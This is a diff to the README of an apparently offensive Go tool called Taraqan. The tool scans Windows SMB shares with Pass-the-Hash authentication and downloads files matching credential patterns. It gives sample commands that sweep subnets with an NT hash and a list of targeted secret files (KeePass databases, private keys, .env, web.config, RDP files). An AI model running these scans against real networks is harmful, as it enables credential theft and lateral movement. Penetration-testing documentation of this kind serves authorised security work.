@@ -1,15 +1,15 @@
 # Taraqan
 
-SMB share scanner with Pass-the-Hash authentication support for penetration testing.
+Credential and sensitive file hunter for Windows networks. Scans SMB shares using Pass-the-Hash authentication and searches for files matching patterns (passwords, keys, configs, credentials).
 
 ## Features
 
-- Pass-the-Hash authentication using NT hash
+- Pass-the-Hash authentication (NTLM)
 - Subnet scanning with CIDR notation
-- Pattern-based file detection
-- Automatic file download
-- Multi-threaded host and share scanning
-- Built-in patterns for sensitive files
+- Pattern-based sensitive file detection  
+- Automatic file download (loot)
+- Multi-threaded scanning
+- Built-in patterns for common secrets
 
 ## Installation
 
@@ -27,14 +27,14 @@ GOOS=linux GOARCH=amd64 go build -o taraqan -ldflags="-s -w" .
 ## Usage
 
 ```bash
-# PTH scan
+# Hunt for secrets using PTH
 ./taraqan -t 192.168.1.0/24 -u admin -d CORP -H 31d6cfe0d16ae931b73c59d7e0c089c0
 
-# Download matched files
+# Download found files
 ./taraqan -t 10.1.2.3 -u admin -d DOMAIN -H hash \
   --patterns "*.kdbx,*password*" --download -v
 
-# Password authentication
+# Password auth
 ./taraqan -t 10.0.0.10 -u admin -d DOMAIN -p "Password123"
 
 # Export results
@@ -65,7 +65,10 @@ GOOS=linux GOARCH=amd64 go build -o taraqan -ldflags="-s -w" .
 
 ## Built-in Patterns
 
-Password files, key files (.kdbx, .pem, .pfx, id_rsa), config files (.ini, .conf, .env), scripts (.bat, .ps1), and common sensitive filenames.
+- Credentials: `*password*`, `*credential*`, `*secret*`
+- Key files: `*.kdbx`, `*.pfx`, `*.pem`, `id_rsa`, `*.ppk`
+- Configs: `web.config`, `.env`, `appsettings.json`
+- Remote access: `*.rdp`, `ultravnc.ini`
 
 ## Disclaimer
 
